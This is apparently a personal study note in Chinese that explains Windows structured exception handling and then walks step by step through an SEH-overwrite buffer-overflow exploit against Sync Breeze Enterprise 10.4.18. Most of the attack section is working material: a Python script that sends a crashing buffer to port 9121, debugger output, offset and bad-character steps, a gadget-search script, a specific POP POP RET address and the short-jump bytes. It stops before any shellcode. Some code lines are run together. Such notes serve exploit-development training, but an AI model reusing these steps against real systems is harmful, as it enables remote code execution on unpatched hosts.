SEH即异常处理结构体(Structure Exception Handler)，它是windows异常处理机制所采用的重要数据结构。SEH是由链表链接的连撞结构。
参考链接：
- https://blog.csdn.net/hustd10/article/details/51167902

每个异常处理器都对应一个EXCEPTION_REGISTRATION_RECORD结构，该结构如下：
![[Pasted image 20220307001213.png]]

这些异常处理器的EXCEPTION_REGISTRATION_RECORD结构连接在一起，组成一个SEH链表。EXCEPTION_REGISTRATION_RECORD结构中的第一个成员Next指向SEH链表中的下一个成员，因此，你可以通过Next来遍历SEH链。EXCEPTION_REGISTRATION_RECORD结构中的第二个成员Handler为一个异常处理函数的函数指针，该异常处理函数定义如下：
![[Pasted image 20220307001250.png]]

函数的第一个参数指向一个_EXCEPTION_RECORD结构。该结构保存了某个异常的相关信息，包括异常码，异常发生的地址，参数的个数等，如下：
![[Pasted image 20220307001304.png]]

_except_handler异常处理函数使用该结构中的信息（还有ContextRecord 参数中的寄存器信息）来判断该异常能否被SEH链中的某个异常处理器处理。EstablisherFrame 参数也很重要，后面会说到。

_except_handler异常处理函数返回EXCEPTION_DISPOSITION，如果为ExceptionContinueExecution，表示该异常是否已经被成功处理，如果为ExceptionContinueSearch，表示当前异常处理器无法处理该异常，异常移交给SEH链中的下一个异常处理器。

那么，异常处理机制是如何使用这些结构和函数来进行异常处理的呢？当一个异常发生的时候，操作系统从SEH链头部开始，检查第一个_EXCEPTION_REGISTRATION_RECORD（即异常处理器）的异常处理函数，看它能否处理该异常（通过ExceptionRecord 和ContextRecord参数）。如果不能，则移动到下一个_EXCEPTION_REGISTRATION_RECORD，继续检查，直到找到合适的异常处理器。Windows在SEH链的末尾放置了一个默认的通用异常处理器，保证异常肯定能被处理。如果使用默认的异常处理器处理，你通常会看到“程序遇到了一个问题，需要关闭…”之类的信息。

参考： https://blog.csdn.net/hustd10/article/details/51167971

Ref：
- https://zhuanlan.zhihu.com/p/345100212 基于SEH的缓冲区溢出 这篇还是很清晰的
- https://forum.butian.net/share/1007  Windows漏洞学习之栈溢出覆盖SEH
- https://pukrr.github.io/2020/05/05/%E5%88%A9%E7%94%A8SEH%E9%93%BE%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/  利用SEH链的缓冲区溢出
- https://www.shuzhiduo.com/A/lk5abAjPd1/ windows漏洞利用
- https://introspelliam.github.io/2017/07/07/0day/SafeSEH%E7%9A%84%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/ SafeSEH参考


基于SEH的缓冲区溢出技术核心是充分利用EXCEPTION_DISPOSITION HANDLE的特征。

SEH大部分由链接的记录列表组成，每个记录对应一个异常处理程序。每个记录的第一个字段是指向下一个记录的指针，第二个字段是异常处理程序的地址。SEH漏洞基于这样的事实:攻击者可以改变堆栈的一部分(通过缓冲区溢出)，并在那里放置值，从而在异常发生后错误地引导SEH handler的执行。

异常发生之后，程序从驻留在堆栈中的第一个SEH handler指向的地址开始执行，攻击者可以找到此地址并更改它。所以攻击者可以通过在堆栈中放置shellcode来改变堆栈，以便改变SEH handler将开始执行的地址，使其指向shellcode。

---

**详细过程如下：**
```text
[Junk][Next SEH][SEH handle][Shellcode]
其中
Next SEH：放置Shellcode地址
SEH handle：放置“POP POP RET”操作函数的地址
```

**- step1. EXCEPTION_DISPOSITION HANDLE，将异常处理中使用的结构体放入栈。

crash the application

 syncbreezeent_setup_v10.4.18.exe

```python
#!/usr/bin/python import socket  
import sys  
from struct import pack

try:  
  server = sys.argv[1] port = 9121  
  size = 1000

  inputBuffer = b"\x41" * size
  header = b"\x75\x19\xba\xab"  
  header += b"\x03\x00\x00\x00"  
  header += b"\x00\x40\x00\x00"  
  header += pack('<I', len(inputBuffer)) header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])
  buf = header + inputBuffer

  print("Sending evil buffer...")  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((server, port))
  s.send(buf)
  s.close()
  print("Done!")

except socket.error:
	print("Could not connect")

```
 
(Exploit-DB - Sync Breeze Enterprise 10.4.18 - Denial of-Service), https://www.exploit-db.com/exploits/44481


发现eax+24h 发生了报错
与上一章节不同的是，EIP 没有被改写
```C++
0:008> r  
eax=41414141 ebx=0192fa1c ecx=0192ff18 edx=0192f9d4 esi=0192ff18 edi=0192fb20 eip=00882a9d esp=0192f9a8 ebp=0192fec8 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 libpal!SCA_ConfigObj::Deserialize+0x1d:  
00882a9d ff5024 call dword ptr [eax+24h] ds:0023:41414165=????????
```

当我们继续让程序执行的时候
我们发现eip被改写为41414141
```C++
0:008> g  
(17f8.1984): Access violation - code c0000005 (first chance)  
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.  
eax=00000000 ebx=00000000 ecx=41414141 edx=770a3b20 esi=00000000 edi=00000000 eip=41414141 esp=0192f438 ebp=0192f458 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246
41414141 ?? ???
```

```text
可以用命令!exchain命令查看当前EH指针的内容（指向处理当前异常的代码地址的指针)

0:009> !exchain
0155fe1c: libpal!md5_starts+149fb (005fdf5b) 0155ff54: 33654132  
Invalid exception stack at 65413165
```

1.2 定位指针
```text
kali@kali:~$ msf-pattern_offset -l 1000 -q 33654131

EH以链表的形式存储在栈中，每一条SEH记录大小为8字节，包含2个元素：

- 指向下一条记录地址的指针（4字节）
- 指向处理当前异常的代码地址的指针（4字节）
```

1.3 发现坏字符（bad characters）

```python
try:  
server = sys.argv[1] port = 9121  
size = 1000
badchars = {
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
  b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
  b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
  b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
  b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
  b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
  b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
  b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
  b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
  b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
  b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
  b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
  b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
  b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
  b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
  b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
  b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
  b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
  b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
}

inputBuffer = b"\x41" * 128  
inputBuffer+= b"\x42\x42\x42\x42"  
inputBuffer+= badchars  
inputBuffer+= b"\x43" * (size - len(inputBuffer))
```
正如预期的那样，我们获得了对指令指针的控制权。 我们现在可以转储传递给 _except_handler 函数的第二个参数 (EstablisherFrame) 指向的字节 (db)。 我们可以从 ESP 偏移 0x08 处的堆栈中获取此参数：

```text
0:007> dds esp L5  
0132f338 77f16b12 ntdll!ExecuteHandler2+0x26 0132f33c 0132f440  
0132f340 0132ff54  
0132f344 0132f45c  
0132f348 0132f3cc

0:007> db 0132ff54  
0132ff54 41 41 41 41 42 42 42 42-01 00 00 00 ec 07 5b 00
```

**- step2. 执行POP POP RET**
```text
[A*128][Next SEH][SEH handle][Shellcode]
其中
Next SEH：放置Shellcode地址
SEH handle：放置“POP POP RET”操作函数的地址
```

基本概念 为啥要找这个
参考：
https://blog.csdn.net/qq_32400847/article/details/53232983

POP POP RET是创建SEH(Structured Exception Handler，结构化异常处理程序)漏洞所需的指令序列。

弹出值所对应的寄存器对于攻击成功不重要，重要的是ESP向更高地址移动两次，然后执行RET。因此，POP EAX，POP EBX，RET或POP ECX，POP ECX，RET或POP EDX，POP EAX，RET(等等)都可以。每次发生POP <寄存器>时，ESP向较高地址移动一个位置(对于32位架构来说是4字节)。每次发生RET时，地址ESP中的内容被放入EIP中执行(ESP也会移动，但这在这里不重要)。为了创建成功的SEH漏洞，必须找到POP POP RET序列的地址使攻击者两次将ESP移向更高地址，然后在ESP指向的地址处执行指令。

找/SafeSEH OFF 且没有DEP 和 ASLR的dll
1)被加载到内存中。  
2)在某处有一个POP POP RET指令序列。  
3)没有使用SafeSEH。
```text
 
0:007>.load narly

0:007>!nmod //选择libspp.dll

0:007>! lm m libspp //查看内存地址范围
start end module name  
10000000 10226000 libspp C (export symbols) C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll

kali@kali:~$ msf-nasm_shell

nasm > pop eax  
00000000 58

nasm > pop ebx 
00000000 5B

nasm > pop ecx 
00000000 59

nasm > pop edx 
00000000 5A

nasm > pop esi
00000000 5E 

nasm > pop edi
00000000 5F

nasm > pop ebp
00000000 5D

nasm > ret 
00000000 C3
```

保存为find_ppr.wds
```C++
.block
{  
	.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
	{
		.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
		{  
			s-[1]b 10000000 10226000 $t0 $t1 c3
		}
	}
}
```
并在windbg中执行
```
0:007> $><C:\Users\offsec\Desktop\find_ppr.wds
0x1015a2f0  
0x100087dd  
0x10008808

验证：
0:009> u 1015a2f0 L3 
libspp!pcre_exec+0x16460:  
1015a2f0 58 pop eax
1015a2f1 5b pop ebx
1015a2f2 c3 ret
```
即此时已经找到PPR地址
```python
try:
  server = sys.argv[1] port = 9121  
  size = 1000
	
  inputBuffer = b"\x41" * 128
  inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```


- **step3.  定位Next SEH值 , 执行JMP：执行跳转命令，6字节大小**
```text
[A*128][Next SEH][0x1015a2f0][Shellcode]
其中
Next SEH：放置Shellcode地址
SEH handle：放置“POP POP RET”操作函数的地址
```

第二个部分是Jmp指令，它位于第一个异常处理器结构的Next SEH成员位置，为什么需要它？因为POP+POP+RET执行后返回到SEH起始地址，此时，如果没有跳转指令，顺序执行，POP+POP+RET还会执行，从而出错，因此，JMP指令的作用就是跳过POP+POP+RET。因此，我们需要跳过4字节，短跳转的操作码为EB，向后跳转四字节为\xeb\x04。由于有4字节的空间，因此再填充两个NOP指令。

单步执行 P/P/R 指令后，我们将使用 a命令汇编短跳转并获取其操作码：
```
0:008> r  
eax=77383b02 ebx=018ff540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000
eip=018fff54 esp=018ff444 ebp=018ff458 iopl=0 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 018fff54 41 inc ecx

0:008> dds eip L4  
018fff54 41414141  
018fff58 1015a2f0 libspp!pcre_exec+0x16460 
018fff5c 43434343  
018fff60 43434343

//小跳一下
0:008> a  
018fff54 jmp 0x018fff5c 
jmp 0x018fff5c 
018fff56

0:008> u eip L1  
018fff54 eb06 jmp 018fff5c

0:008> dds eip L4  
018fff54 414106eb  
018fff58 1015a2f0 libspp!pcre_exec+0x16460 
018fff5c 43434343  
018fff60 43434343
```

没看懂 这个应该是值得next seh 
默认都是0xeb069090

jmp short对应的机器码是eb占一个字节，后面需要添加一个偏移位置占一个字节，这样剩下的间隔应该就是6个字节，所以next SEH的位置应该填eb 06。

由于Next SEH(SEH链表指针)占4字节，所以我们需要使用0x90来填充空余的两个字节。

```text
[A*124][0xeb069090][0x1015a2f0][Shellcode]
```



step5.执行shell代码：这里运行的是黑客用于攻击的shell代码。


---



